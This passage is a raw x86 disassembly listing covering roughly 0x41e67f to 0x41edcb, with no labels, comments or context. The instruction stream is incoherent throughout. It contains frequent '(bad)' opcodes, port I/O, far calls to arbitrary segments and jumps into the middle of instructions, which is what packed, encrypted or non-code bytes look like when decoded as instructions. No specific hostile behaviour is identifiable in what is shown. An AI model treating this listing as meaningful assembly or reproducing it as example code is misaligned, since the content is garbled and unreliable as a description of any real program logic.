  41e67f:	mov    ds:0x6b287603,al
  41e684:	xor    DWORD PTR [ecx+0x6a],0x6
  41e688:	or     al,0x10
  41e68a:	inc    DWORD PTR [edi-0x2cb2031d]
  41e690:	(bad)  
  41e691:	mov    dl,0xdf
  41e693:	daa    
  41e694:	xchg   ecx,eax
  41e695:	lods   eax,DWORD PTR ds:[esi]
  41e696:	sub    DWORD PTR [eax],ecx
  41e698:	pop    esi
  41e699:	pop    ecx
  41e69a:	mov    eax,DWORD PTR [edx]
  41e69c:	mov    bh,0x98
  41e69e:	mov    al,0xdc
  41e6a0:	mov    bl,0x88
  41e6a2:	adc    eax,eax
  41e6a4:	and    DWORD PTR [esi+0x4a],esi
  41e6a7:	lock sahf 
  41e6a9:	inc    esi
  41e6aa:	clc    
  41e6ab:	xor    al,0x86
  41e6ad:	or     DWORD PTR cs:[edi-0x7a],0xe28c57c2
  41e6b5:	mov    edi,0x8b2fba1d
  41e6ba:	cli    
  41e6bb:	add    ecx,ebx
  41e6bd:	pushf  
  41e6be:	test   al,0x16
  41e6c0:	fwait
  41e6c1:	mov    ecx,0x7e8f41fb
  41e6c6:	dec    edx
  41e6c7:	imul   ecx,DWORD PTR [edx],0xc080f768
  41e6cd:	sar    BYTE PTR [esi+0x52],cl
  41e6d0:	das    
  41e6d1:	push   0xf6afd5db
  41e6d6:	mov    DWORD PTR [edx-0x250b5a3f],edx
  41e6dc:	sub    DWORD PTR [edx-0xfc62647],0x4b
  41e6e3:	cmp    al,0xe4
  41e6e5:	clc    
  41e6e6:	and    BYTE PTR [ebx-0x46],cl
  41e6e9:	in     eax,dx
  41e6ea:	pop    esi
  41e6eb:	and    DWORD PTR [eax+ecx*2+0x1f],ecx
  41e6ef:	in     al,dx
  41e6f0:	lock dec esp
  41e6f2:	pop    esi
  41e6f3:	push   cs
  41e6f4:	mov    al,0xc1
  41e6f6:	shl    BYTE PTR [ecx+0x17],0x27
  41e6fa:	mov    dl,0x6
  41e6fc:	or     al,0x8e
  41e6fe:	push   ss
  41e6ff:	(bad)  
  41e700:	mov    bl,0x7b
  41e702:	pop    edx
  41e703:	inc    ebp
  41e704:	lock mov BYTE PTR [ecx],cl
  41e707:	mov    esp,DWORD PTR [esi]
  41e709:	adc    cl,cl
  41e70b:	and    edi,DWORD PTR [edi+0x41]
  41e70e:	inc    ecx
  41e70f:	stos   BYTE PTR es:[edi],al
  41e710:	adc    BYTE PTR [edx+0x20f99a38],0x29
  41e717:	cli    
  41e718:	jg     0x41e76d
  41e71a:	hlt    
  41e71b:	jnp    0x41e71c
  41e71d:	cld    
  41e71e:	retf   0x346a
  41e721:	add    bh,BYTE PTR [ecx+0x680787df]
  41e727:	xlat   BYTE PTR ds:[ebx]
  41e728:	jns    0x41e705
  41e72a:	cmp    edi,ecx
  41e72c:	int    0x73
  41e72e:	pop    ds
  41e72f:	(bad)  
  41e731:	clc    
  41e732:	jno    0x41e751
  41e734:	daa    
  41e735:	aaa    
  41e736:	add    dh,BYTE PTR [edi]
  41e738:	out    dx,eax
  41e739:	sbb    edx,DWORD PTR [ebx+eiz*1+0x2e]
  41e73d:	loop   0x41e75d
  41e73f:	mov    esi,0xc81f4157
  41e744:	stos   DWORD PTR es:[edi],eax
  41e745:	shl    DWORD PTR [edi+0x46034c2c],cl
  41e74b:	into   
  41e74c:	mov    ds:0x7cfdaba,al
  41e751:	repz and esi,DWORD PTR [ecx+0x37]
  41e755:	fwait
  41e756:	pop    ebp
  41e757:	les    edx,FWORD PTR [eax]
  41e759:	sbb    BYTE PTR [eax+edx*1],bh
  41e75c:	ror    BYTE PTR [ebp-0x44],1
  41e75f:	les    ebx,FWORD PTR [ecx]
  41e761:	mov    esi,0x91a98597
  41e766:	jb     0x41e758
  41e768:	lods   eax,DWORD PTR ds:[esi]
  41e769:	and    BYTE PTR [esi+0x14],ah
  41e76c:	xchg   ebp,edx
  41e76e:	add    eax,0x8d6ffa63
  41e773:	pop    es
  41e774:	mov    edx,0x16899547
  41e779:	out    0xb4,al
  41e77b:	repz ret 
  41e77d:	sub    al,0x19
  41e77f:	int3   
  41e780:	cmp    eax,0x4b9d8296
  41e785:	inc    esp
  41e786:	dec    esp
  41e787:	inc    ebp
  41e788:	push   ss
  41e789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e78a:	ja     0x41e7d9
  41e78c:	xchg   ebp,eax
  41e78d:	push   0x7a
  41e78f:	sar    BYTE PTR [esi+0x18],1
  41e792:	sub    cl,BYTE PTR [edi]
  41e794:	sub    DWORD PTR [eax+eiz*8+0x793bdab3],esi
  41e79b:	sar    cl,cl
  41e79d:	lock xchg DWORD PTR [edi-0x41e1306c],esi
  41e7a4:	mov    dh,0xcb
  41e7a6:	or     ebp,DWORD PTR [eax]
  41e7a8:	push   esp
  41e7a9:	xor    eax,0x7118a968
  41e7ae:	or     BYTE PTR [edx-0x7488fc56],bh
  41e7b4:	jns    0x41e822
  41e7b6:	xchg   DWORD PTR [edi-0xde6f790],edi
  41e7bc:	repnz popa 
  41e7be:	sahf   
  41e7bf:	inc    ebp
  41e7c0:	push   edx
  41e7c1:	pop    esp
  41e7c2:	push   ecx
  41e7c3:	cmp    edx,DWORD PTR [edi+0x1fc2dbb7]
  41e7c9:	sbb    eax,0x5197957b
  41e7ce:	mov    ecx,0xfd855e12
  41e7d3:	xor    al,0x68
  41e7d5:	cwde   
  41e7d6:	pop    edi
  41e7d7:	jp     0x41e784
  41e7d9:	lea    eax,[ecx-0x3a]
  41e7dc:	jle    0x41e803
  41e7de:	or     DWORD PTR [ebp-0x8],edx
  41e7e1:	cwde   
  41e7e2:	inc    ebp
  41e7e3:	aam    0xcd
  41e7e5:	dec    eax
  41e7e6:	mov    ds:0x62eb2889,al
  41e7eb:	dec    ecx
  41e7ec:	fmul   st,st(3)
  41e7ee:	jbe    0x41e795
  41e7f0:	aas    
  41e7f1:	dec    ebp
  41e7f2:	call   0x6059:0xf4a877fd
  41e7f9:	xor    edi,ebx
  41e7fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7fc:	sub    eax,esi
  41e7fe:	xchg   edx,eax
  41e7ff:	ins    BYTE PTR es:[edi],dx
  41e800:	je     0x41e83e
  41e802:	mov    al,ds:0xb9f1921f
  41e807:	inc    esi
  41e808:	ins    BYTE PTR es:[edi],dx
  41e809:	sub    bl,BYTE PTR [edx+0x3f]
  41e80c:	or     esi,DWORD PTR [esi-0x66]
  41e80f:	dec    ebp
  41e810:	push   ebp
  41e811:	fnsave [eax+0x6bc5b56b]
  41e817:	jno    0x41e856
  41e819:	mov    ecx,0xa19079d2
  41e81e:	repz pop edx
  41e820:	and    BYTE PTR [ebx-0x2964921d],bl
  41e826:	add    BYTE PTR [edi-0x1719f2bf],0xc3
  41e82d:	es jae 0x41e860
  41e830:	cli    
  41e831:	into   
  41e832:	jge    0x41e7bd
  41e834:	cmp    dl,ah
  41e836:	sar    esp,cl
  41e838:	xor    eax,0x24000d1b
  41e83d:	jecxz  0x41e807
  41e83f:	and    al,0x0
  41e841:	iret   
  41e842:	aad    0xeb
  41e844:	push   ss
  41e845:	dec    ebp
  41e846:	aad    0xc2
  41e848:	jns    0x41e7cf
  41e84a:	push   0x4f9546f9
  41e84f:	(bad)  
  41e850:	lods   eax,DWORD PTR ds:[esi]
  41e851:	dec    ebx
  41e852:	stc    
  41e853:	add    DWORD PTR [edx-0x31],0x4eafbe1e
  41e85a:	or     bl,BYTE PTR [edi]
  41e85c:	xor    dh,al
  41e85e:	sub    edi,DWORD PTR [eax]
  41e860:	gs ins BYTE PTR es:[edi],dx
  41e862:	xor    al,0x88
  41e864:	test   DWORD PTR [eax+0x6e7f6d45],esi
  41e86a:	xchg   edi,eax
  41e86b:	jmp    0x231bce94
  41e870:	(bad)  
  41e871:	mov    al,0x83
  41e873:	daa    
  41e874:	loopne 0x41e8bf
  41e876:	jge    0x41e8d3
  41e878:	push   ss
  41e879:	push   0x19b29c4e
  41e87e:	loopne 0x41e88c
  41e880:	test   BYTE PTR [eax+esi*8+0x28],al
  41e884:	dec    edi
  41e885:	dec    ebp
  41e886:	or     dl,BYTE PTR [ecx+0x7b588cb0]
  41e88c:	jmp    0x6969:0xc3613d67
  41e893:	jecxz  0x41e879
  41e895:	pop    ds
  41e896:	int3   
  41e897:	or     BYTE PTR [esp-0x880b34d],ah
  41e89e:	mov    cl,0x28
  41e8a0:	ja     0x41e84a
  41e8a2:	jle    0x41e88d
  41e8a4:	fwait
  41e8a5:	jnp    0x41e8e0
  41e8a7:	inc    ecx
  41e8a8:	adc    BYTE PTR [ebx-0x5a],bl
  41e8ab:	ja     0x41e83d
  41e8ad:	push   es
  41e8ae:	mov    esi,0x55af017b
  41e8b3:	mov    ds:0x2a9e4087,al
  41e8b8:	adc    edi,ebx
  41e8ba:	rcr    BYTE PTR [eax-0x2b4254a7],0xe7
  41e8c1:	lods   al,BYTE PTR ds:[esi]
  41e8c2:	mov    ah,0x2e
  41e8c4:	cmc    
  41e8c5:	xchg   ecx,edi
  41e8c7:	inc    ecx
  41e8c8:	bound  edx,QWORD PTR [edi+0x1beede15]
  41e8ce:	jo     0x41e867
  41e8d0:	fldenv [edx+0x78dc138]
  41e8d6:	arpl   WORD PTR [ebx-0x6c],bx
  41e8d9:	mov    ebp,0xe9c6bf7e
  41e8de:	cwde   
  41e8df:	nop
  41e8e0:	jge    0x41e8d9
  41e8e2:	or     al,0xdd
  41e8e4:	and    ah,BYTE PTR ds:0x8786978
  41e8ea:	lods   eax,DWORD PTR ds:[esi]
  41e8eb:	mov    eax,0x953c8e00
  41e8f0:	loopne 0x41e969
  41e8f2:	cmp    dl,BYTE PTR [ecx-0x63]
  41e8f5:	mov    esi,0xca2d869b
  41e8fa:	cmp    DWORD PTR [eax+0x29],esp
  41e8fd:	out    0xde,eax
  41e8ff:	inc    BYTE PTR [ebp-0x6b]
  41e902:	ret    
  41e903:	jo     0x41e956
  41e905:	inc    eax
  41e906:	stos   DWORD PTR es:[edi],eax
  41e907:	jne    0x41e933
  41e909:	(bad)  
  41e90a:	sar    BYTE PTR [esp+eax*8],cl
  41e90d:	loope  0x41e8d0
  41e90f:	stos   DWORD PTR es:[edi],eax
  41e910:	dec    esp
  41e911:	or     eax,0x960fd39c
  41e916:	stos   BYTE PTR es:[edi],al
  41e917:	jp     0x41e94e
  41e919:	in     al,dx
  41e91a:	jp     0x41e964
  41e91c:	push   ecx
  41e91d:	mov    ah,BYTE PTR [esi-0x70d270b6]
  41e923:	xlat   BYTE PTR ds:[ebx]
  41e924:	jmp    0xaa84be13
  41e929:	(bad)  
  41e92b:	in     al,0x6b
  41e92d:	(bad)  
  41e92e:	outs   dx,DWORD PTR ds:[esi]
  41e92f:	retf   
  41e930:	xor    BYTE PTR [esi+esi*8-0x37],bh
  41e934:	jne    0x41e950
  41e936:	ss out dx,al
  41e938:	ret    
  41e939:	clc    
  41e93a:	leave  
  41e93b:	mov    edx,0x5f57e74b
  41e940:	dec    ecx
  41e941:	cs dec eax
  41e943:	fnstenv [ecx+0xc]
  41e946:	mov    dh,0x74
  41e948:	mov    cl,0x6
  41e94a:	out    0x8e,al
  41e94c:	outs   dx,DWORD PTR ds:[esi]
  41e94d:	add    edx,DWORD PTR [ebp*1+0x40173d4f]
  41e954:	retf   0xbb74
  41e957:	aas    
  41e958:	cmp    bl,BYTE PTR [ecx]
  41e95a:	pop    ecx
  41e95b:	jp     0x41e990
  41e95d:	fimul  DWORD PTR [edi]
  41e95f:	mov    ch,0xfd
  41e961:	inc    edi
  41e962:	push   0xf02f38cc
  41e967:	ins    BYTE PTR es:[edi],dx
  41e968:	mov    esp,0x6df23727
  41e96d:	adc    BYTE PTR [esi-0x1259d3d2],bl
  41e973:	addr16 jmp 0xa3fdb3be
  41e979:	shr    DWORD PTR [ebp-0x6a9c4ccd],1
  41e97f:	mov    bl,0xd7
  41e981:	mov    cl,0x35
  41e983:	(bad)  [ecx]
  41e985:	dec    esi
  41e986:	daa    
  41e987:	ins    DWORD PTR es:[edi],dx
  41e988:	pop    ecx
  41e989:	cmp    ebx,DWORD PTR [ebx+0x3e033d44]
  41e98f:	xor    al,0xb0
  41e991:	gs mov edx,0xa4942cf3
  41e997:	push   eax
  41e998:	mov    ah,BYTE PTR [edi+0x2b]
  41e99b:	fwait
  41e99c:	jp     0x41e9fc
  41e99e:	xor    ecx,DWORD PTR [edx+0x4c]
  41e9a1:	cmp    eax,0x5bb4e390
  41e9a6:	(bad)  
  41e9a7:	mov    ebx,0xb1d8e291
  41e9ac:	mov    ?,esp
  41e9ae:	ror    BYTE PTR [eax],0xc4
  41e9b1:	cmp    cl,BYTE PTR [esi-0x7045630b]
  41e9b7:	jg     0x41ea29
  41e9b9:	fwait
  41e9ba:	xor    DWORD PTR [ebp+0x470aa4e9],edx
  41e9c0:	lock adc bh,BYTE PTR [ebx+0x14faa1c]
  41e9c7:	aaa    
  41e9c8:	add    ch,bl
  41e9ca:	push   eax
  41e9cb:	sbb    al,0x9a
  41e9cd:	int    0x8e
  41e9cf:	repnz dec esp
  41e9d1:	jo     0x41e973
  41e9d3:	into   
  41e9d4:	inc    ebx
  41e9d5:	inc    ebx
  41e9d6:	lahf   
  41e9d7:	xor    ch,ch
  41e9d9:	cs (bad) 
  41e9db:	and    eax,0x67d8fe13
  41e9e0:	scas   al,BYTE PTR es:[edi]
  41e9e1:	adc    ebx,DWORD PTR [edx]
  41e9e3:	push   esi
  41e9e4:	imul   esi,DWORD PTR [esi+eiz*4+0x4c999863],0x3b
  41e9ec:	xchg   edx,eax
  41e9ed:	(bad)  
  41e9ee:	lock push ds
  41e9f0:	dec    ebp
  41e9f1:	ds in  al,dx
  41e9f3:	mov    eax,0x6414e7a2
  41e9f8:	fstp   TBYTE PTR [ebp+0x7f]
  41e9fb:	push   ss
  41e9fc:	adc    cl,BYTE PTR fs:[eax]
  41e9ff:	les    esp,FWORD PTR [ecx-0x24]
  41ea02:	and    BYTE PTR [edx],dl
  41ea04:	cmp    BYTE PTR [eax+0xec44f16],0xe7
  41ea0b:	aas    
  41ea0c:	inc    ebx
  41ea0d:	mov    bh,0x1d
  41ea0f:	and    bh,BYTE PTR [esi-0x17]
  41ea12:	push   cs
  41ea13:	lahf   
  41ea14:	lahf   
  41ea15:	push   eax
  41ea16:	retf   0x421c
  41ea19:	xor    eax,0xe9e82766
  41ea1e:	scas   eax,DWORD PTR es:[edi]
  41ea1f:	sub    dl,0xa0
  41ea22:	push   ebp
  41ea23:	jmp    0x41ea5e
  41ea25:	leave  
  41ea26:	push   edx
  41ea27:	daa    
  41ea28:	inc    BYTE PTR [edx+eiz*4]
  41ea2b:	gs xchg ebx,esi
  41ea2e:	lods   al,BYTE PTR ds:[esi]
  41ea2f:	es and dl,0x28
  41ea33:	jmp    0x41e9be
  41ea35:	pop    ebx
  41ea36:	xor    DWORD PTR [eax],0xbfaedd64
  41ea3c:	mov    WORD PTR [ebx],es
  41ea3e:	jge    0x41ea3e
  41ea40:	std    
  41ea41:	or     BYTE PTR [ebx+0x40826624],0x3a
  41ea48:	mov    ebp,0xa9821702
  41ea4d:	je     0x41e9eb
  41ea4f:	add    cl,BYTE PTR ds:0x56ea42f4
  41ea55:	mov    eax,0xf45e664d
  41ea5a:	mov    eax,ds:0x80bb31e1
  41ea5f:	addr16 inc eax
  41ea61:	mov    eax,0x62ecfdda
  41ea66:	in     eax,dx
  41ea67:	mov    ds,esp
  41ea69:	and    cl,ch
  41ea6b:	xor    eax,0xf1c59d91
  41ea70:	dec    esp
  41ea71:	iret   
  41ea72:	clc    
  41ea73:	and    eax,0x4d1e4772
  41ea78:	ret    0xf38b
  41ea7b:	test   al,0x51
  41ea7d:	loopne 0x41ea84
  41ea7f:	retf   0x1344
  41ea82:	mov    ebx,0x6447cfce
  41ea87:	dec    edi
  41ea88:	dec    ebp
  41ea89:	mov    cs,WORD PTR [ecx]
  41ea8b:	jne    0x41eab9
  41ea8d:	push   ss
  41ea8e:	loopne 0x41ea10
  41ea90:	mov    ebp,0x11b3190b
  41ea95:	cmc    
  41ea96:	outs   dx,DWORD PTR ds:[esi]
  41ea97:	push   ecx
  41ea98:	enter  0x9a30,0xf6
  41ea9c:	xor    DWORD PTR [eax-0x35130d7d],ebx
  41eaa2:	adc    cl,dh
  41eaa4:	outs   dx,DWORD PTR ds:[esi]
  41eaa5:	xor    BYTE PTR [eax],al
  41eaa7:	jns    0x41ead2
  41eaa9:	adc    bh,BYTE PTR [esi-0x5d8965a7]
  41eaaf:	pushf  
  41eab0:	fcom   DWORD PTR [ebx-0x6a]
  41eab3:	fwait
  41eab4:	xchg   BYTE PTR [ebp-0x9],bl
  41eab7:	sbb    al,0x35
  41eab9:	mov    ds:0xe3fc8645,eax
  41eabe:	xor    ebp,DWORD PTR [ebx+0x3ddd08ef]
  41eac4:	mov    fs,WORD PTR [ebx-0x1b8452f0]
  41eaca:	jecxz  0x41eabe
  41eacc:	xchg   ebx,eax
  41eacd:	or     dh,BYTE PTR [edi]
  41eacf:	or     BYTE PTR [edx+0x22b00a13],cl
  41ead5:	pop    ebx
  41ead6:	in     eax,dx
  41ead7:	sbb    ah,dl
  41ead9:	(bad)  
  41eada:	add    DWORD PTR [eax],ebx
  41eadc:	mov    eax,ds:0xb89b40e5
  41eae1:	sub    BYTE PTR [ebx+eiz*2+0xc0b3d8d],cl
  41eae8:	inc    ebx
  41eae9:	sbb    BYTE PTR [edi+eiz*1+0x33],ch
  41eaed:	pop    edx
  41eaee:	stos   BYTE PTR es:[edi],al
  41eaef:	xchg   edx,eax
  41eaf0:	out    dx,eax
  41eaf1:	pop    esi
  41eaf2:	sahf   
  41eaf3:	xor    dl,bl
  41eaf5:	jne    0x41eb3a
  41eaf7:	retf   0x3a7a
  41eafa:	popf   
  41eafb:	sub    BYTE PTR ds:[esi-0xd],ah
  41eaff:	cmc    
  41eb00:	inc    edx
  41eb01:	mov    ah,0x2a
  41eb03:	int    0x5
  41eb05:	dec    edx
  41eb06:	cmp    al,0x68
  41eb08:	jne    0x41eb6b
  41eb0a:	add    cl,al
  41eb0c:	lods   al,BYTE PTR ds:[esi]
  41eb0d:	sub    BYTE PTR [ebp+0x26],cl
  41eb10:	fdivr  st,st(5)
  41eb12:	push   ss
  41eb13:	sbb    BYTE PTR [esi-0x41e01105],0xca
  41eb1a:	push   es
  41eb1b:	bnd jp 0x41eb89
  41eb1e:	sbb    esi,DWORD PTR [eax]
  41eb20:	dec    esp
  41eb21:	cld    
  41eb22:	xor    edi,DWORD PTR ds:[esi+0x1]
  41eb26:	aad    0xc8
  41eb28:	or     edi,DWORD PTR [ebx+0x62d888be]
  41eb2e:	jno    0x41eb34
  41eb30:	outs   dx,DWORD PTR ds:[esi]
  41eb31:	adc    DWORD PTR [eax],ecx
  41eb33:	lods   al,BYTE PTR ds:[esi]
  41eb34:	cdq    
  41eb35:	sub    bh,ah
  41eb37:	mov    ebx,0xbf096e8d
  41eb3c:	test   dl,0x55
  41eb3f:	not    DWORD PTR [eax-0x32]
  41eb42:	adc    dh,bl
  41eb44:	mov    cl,0xc8
  41eb46:	out    dx,eax
  41eb47:	pusha  
  41eb48:	jae    0x41eb2b
  41eb4a:	xchg   BYTE PTR [ebx+0xf5ef6bf],al
  41eb50:	add    al,0x6a
  41eb53:	inc    ebx
  41eb54:	mov    esi,0xad269e5
  41eb59:	or     ebp,DWORD PTR [edx+0x567cf6b]
  41eb5f:	(bad)  
  41eb60:	outs   dx,DWORD PTR ds:[esi]
  41eb61:	push   ss
  41eb62:	lahf   
  41eb63:	int3   
  41eb64:	or     cl,al
  41eb66:	push   eax
  41eb67:	jo     0x41eb8e
  41eb69:	ja     0x41eafa
  41eb6b:	shl    BYTE PTR [edi-0x2c],0x33
  41eb6f:	xor    ch,BYTE PTR [edi]
  41eb71:	stos   DWORD PTR es:[edi],eax
  41eb72:	aad    0xc7
  41eb74:	out    0xf2,al
  41eb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb77:	mov    ds:0xeae51ffb,al
  41eb7c:	call   0xc504:0xf85dfd43
  41eb83:	pop    ds
  41eb84:	adc    esp,ecx
  41eb86:	loope  0x41ebff
  41eb88:	daa    
  41eb89:	inc    esp
  41eb8a:	xor    ah,bl
  41eb8c:	mov    edx,0x66d2aa58
  41eb91:	(bad)  
  41eb92:	push   edi
  41eb93:	mov    bl,BYTE PTR [ecx]
  41eb95:	in     eax,0x7f
  41eb97:	jle    0x41ec17
  41eb99:	or     DWORD PTR [esi],esi
  41eb9b:	pop    ecx
  41eb9c:	mov    esi,DWORD PTR [ebp-0x9]
  41eb9f:	addr16 xor eax,0xbcc2ddc1
  41eba5:	jbe    0x41eb8c
  41eba7:	mov    ecx,0xf934eb74
  41ebac:	loop   0x41eb43
  41ebae:	or     DWORD PTR [ebp-0x646bd41d],0x2f
  41ebb5:	inc    eax
  41ebb6:	mov    DWORD PTR [ebp+0x63],esi
  41ebb9:	fwait
  41ebba:	pop    edx
  41ebbb:	fld    QWORD PTR [esi-0x6c2a9570]
  41ebc1:	sub    al,0x5c
  41ebc3:	xor    DWORD PTR ds:[edx],ecx
  41ebc6:	inc    edx
  41ebc7:	out    0x99,eax
  41ebc9:	and    DWORD PTR [bx+si],esp
  41ebcc:	sub    eax,0xc6b6b4e0
  41ebd1:	add    eax,0xc09e2bc0
  41ebd6:	scas   eax,DWORD PTR es:[edi]
  41ebd7:	inc    ebx
  41ebd8:	int3   
  41ebd9:	push   ss
  41ebda:	jbe    0x41ec3a
  41ebdc:	out    dx,al
  41ebdd:	inc    ebp
  41ebde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebdf:	xchg   BYTE PTR [edx],dl
  41ebe1:	adc    eax,0x48c8b95a
  41ebe6:	sbb    dl,BYTE PTR [ecx]
  41ebe8:	push   edi
  41ebe9:	sub    dh,BYTE PTR [esi+0x1cd234bc]
  41ebef:	(bad)  
  41ebf0:	(bad)  
  41ebf1:	(bad)  
  41ebf2:	mov    ebx,0x1d77f8e9
  41ebf7:	jmp    0x1cc37f5
  41ebfc:	sub    eax,DWORD PTR [ecx]
  41ebfe:	outs   dx,DWORD PTR ds:[esi]
  41ebff:	add    DWORD PTR [ebx],eax
  41ec01:	imul   eax,DWORD PTR ds:0x99dba18f,0xffffff8b
  41ec08:	jb     0x41ec00
  41ec0a:	mov    ds:0xb70d12a8,eax
  41ec0f:	cmc    
  41ec10:	dec    ebp
  41ec11:	int    0x4b
  41ec13:	jbe    0x41eb96
  41ec15:	call   0x29380ecd
  41ec1a:	push   ebx
  41ec1b:	dec    edi
  41ec1c:	xor    BYTE PTR [edx-0x70cfdc03],bh
  41ec22:	mov    cl,0x24
  41ec24:	ins    DWORD PTR es:[edi],dx
  41ec25:	cmp    al,0x71
  41ec27:	push   edx
  41ec28:	lock pop edx
  41ec2a:	inc    ebx
  41ec2b:	and    ebx,edx
  41ec2d:	mov    ebp,0x8b08dcaa
  41ec32:	pop    eax
  41ec33:	cwde   
  41ec34:	shl    DWORD PTR [edx+0x31b5c2c5],0xc0
  41ec3b:	jne    0x41ec42
  41ec3d:	pop    esi
  41ec3e:	dec    eax
  41ec3f:	sbb    BYTE PTR [eax+0x73],cl
  41ec42:	daa    
  41ec43:	(bad)  
  41ec44:	in     eax,dx
  41ec45:	sub    DWORD PTR [eax-0x38],edx
  41ec48:	fisubr DWORD PTR [esi+ebp*4-0x68ba2fb2]
  41ec4f:	cmp    dh,BYTE PTR [ebx-0x13]
  41ec52:	ret    0x7a45
  41ec55:	iret   
  41ec56:	sbb    DWORD PTR ds:[edi+0x752abdb9],esp
  41ec5d:	out    dx,eax
  41ec5e:	ins    BYTE PTR es:[edi],dx
  41ec5f:	add    eax,0xa133780b
  41ec64:	outs   dx,DWORD PTR ds:[esi]
  41ec65:	pop    ds
  41ec66:	sahf   
  41ec67:	lods   eax,DWORD PTR ds:[esi]
  41ec68:	xor    esi,edx
  41ec6a:	mov    al,ds:0xbc5a09a9
  41ec6f:	cmp    bl,bh
  41ec71:	das    
  41ec72:	and    edi,edx
  41ec74:	inc    ecx
  41ec75:	fcomp  QWORD PTR [edx]
  41ec77:	push   esp
  41ec78:	scas   eax,DWORD PTR es:[edi]
  41ec79:	jl     0x41ecf9
  41ec7b:	stc    
  41ec7c:	jae    0x41ec2f
  41ec7e:	jne    0x41ec74
  41ec80:	ss dec ebx
  41ec82:	jne    0x41ec99
  41ec84:	push   esi
  41ec85:	call   0x2ba:0xa1645674
  41ec8c:	mov    esp,ss
  41ec8e:	repnz and ecx,DWORD PTR es:[edx+eiz*4+0x24]
  41ec94:	(bad)  
  41ec95:	and    eax,0x98f7a9cd
  41ec9a:	dec    ebx
  41ec9b:	cld    
  41ec9c:	jns    0x41ecd5
  41ec9e:	pop    ds
  41ec9f:	mov    edi,0x62d88c7b
  41eca4:	jne    0x41ec4a
  41eca6:	mov    esi,0x685ab665
  41ecab:	mov    bl,0xad
  41ecad:	mov    cl,0x8e
  41ecaf:	adc    eax,0x91a67f6a
  41ecb4:	pop    ecx
  41ecb5:	std    
  41ecb6:	mov    edx,0x65ea852b
  41ecbb:	sbb    ebp,DWORD PTR [ecx-0x54]
  41ecbe:	out    dx,eax
  41ecbf:	call   0x171d8afe
  41ecc4:	fild   QWORD PTR [ecx-0x1da5740]
  41ecca:	and    ebx,DWORD PTR [ecx]
  41eccc:	or     ecx,DWORD PTR ds:0x782a6e96
  41ecd2:	in     al,0x1f
  41ecd4:	int3   
  41ecd5:	jnp    0x41ecff
  41ecd7:	inc    esp
  41ecd8:	stc    
  41ecd9:	sbb    DWORD PTR [edi+eax*2-0xe6d66f8],eax
  41ece0:	out    0xeb,eax
  41ece2:	and    eax,0x7bb40cd6
  41ece7:	mov    al,ds:0x26763db3
  41ecec:	sahf   
  41eced:	fwait
  41ecee:	mov    eax,0x2fc2c417
  41ecf3:	push   ss
  41ecf4:	jo     0x41ecbd
  41ecf6:	shr    esi,0x6
  41ecf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecfa:	xor    esi,edi
  41ecfc:	mov    al,0x87
  41ecfe:	pop    ebx
  41ecff:	mov    dl,0x3f
  41ed01:	dec    esi
  41ed02:	dec    edx
  41ed03:	mov    dh,0x87
  41ed05:	jmp    0x88281b69
  41ed0a:	ins    BYTE PTR es:[edi],dx
  41ed0b:	push   eax
  41ed0c:	sbb    esi,edi
  41ed0e:	inc    esi
  41ed0f:	mov    es,WORD PTR [edx-0x6cf571b6]
  41ed15:	scas   al,BYTE PTR es:[edi]
  41ed16:	jge    0x41ed36
  41ed18:	lock sar DWORD PTR [edi],1
  41ed1b:	xor    al,0x81
  41ed1d:	jmp    0x8768403b
  41ed22:	std    
  41ed23:	jbe    0x41ed0a
  41ed25:	dec    ebx
  41ed26:	jge    0x41ed1b
  41ed28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed29:	mov    esp,0x569ea4e9
  41ed2e:	aaa    
  41ed2f:	jbe    0x41ed4e
  41ed31:	sub    ebx,DWORD PTR [esi-0x34]
  41ed34:	int    0x25
  41ed36:	inc    esi
  41ed37:	mov    ch,0xed
  41ed39:	enter  0x6915,0x15
  41ed3d:	aad    0x1f
  41ed3f:	jnp    0x41ed8b
  41ed41:	mov    al,ds:0xb12af5e
  41ed46:	test   DWORD PTR [edi],ecx
  41ed48:	bound  ebp,QWORD PTR [eax+ecx*2]
  41ed4b:	rcl    bl,cl
  41ed4d:	in     eax,dx
  41ed4e:	sahf   
  41ed4f:	stc    
  41ed50:	daa    
  41ed51:	xor    bl,BYTE PTR [ecx]
  41ed53:	and    al,0xb7
  41ed55:	jle    0x41edb2
  41ed57:	mov    eax,0xc2cd8039
  41ed5c:	sahf   
  41ed5d:	call   0x8ef0dcf
  41ed62:	vrsqrtss xmm2,xmm6,xmm7
  41ed66:	pop    es
  41ed67:	(bad)  
  41ed68:	aaa    
  41ed69:	rcl    DWORD PTR [esi+0x7915de7f],1
  41ed6f:	jnp    0x41ed17
  41ed71:	jmp    0xb2eedf2e
  41ed76:	pop    es
  41ed77:	inc    esi
  41ed78:	int    0xe8
  41ed7a:	pop    ss
  41ed7b:	inc    eax
  41ed7c:	int3   
  41ed7d:	lock adc edx,eax
  41ed80:	add    ebx,DWORD PTR [edi+0x38bba07]
  41ed86:	out    0x93,eax
  41ed88:	add    cl,bh
  41ed8a:	sti    
  41ed8b:	loopne 0x41edcd
  41ed8d:	push   ss
  41ed8e:	lock pop edi
  41ed90:	(bad)  
  41ed92:	ja     0x41ee05
  41ed94:	push   ecx
  41ed95:	(bad)  
  41ed96:	pop    ss
  41ed97:	shl    DWORD PTR [esi+0x20],0x12
  41ed9b:	cli    
  41ed9c:	leave  
  41ed9d:	ficomp WORD PTR [ebx+0x377e9f08]
  41eda3:	dec    eax
  41eda4:	sbb    eax,0x29feb1ef
  41eda9:	repnz out dx,eax
  41edab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edac:	das    
  41edad:	cli    
  41edae:	dec    esp
  41edaf:	nop
  41edb0:	in     eax,0x7e
  41edb2:	mov    dl,0xeb
  41edb4:	in     eax,0x91
  41edb6:	in     al,dx
  41edb7:	lods   al,BYTE PTR ds:[esi]
  41edb8:	jnp    0x41ed94
  41edba:	jg     0x41ed61
  41edbc:	fcom   QWORD PTR [ebx]
  41edbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edbf:	out    0xf1,al
  41edc1:	push   ss
  41edc2:	into   
  41edc3:	dec    ebx
  41edc4:	cli    
  41edc5:	mov    eax,ds:0xbf54d33a
  41edca:	outs   dx,DWORD PTR ds:[esi]
  41edcb:	pop    ebx
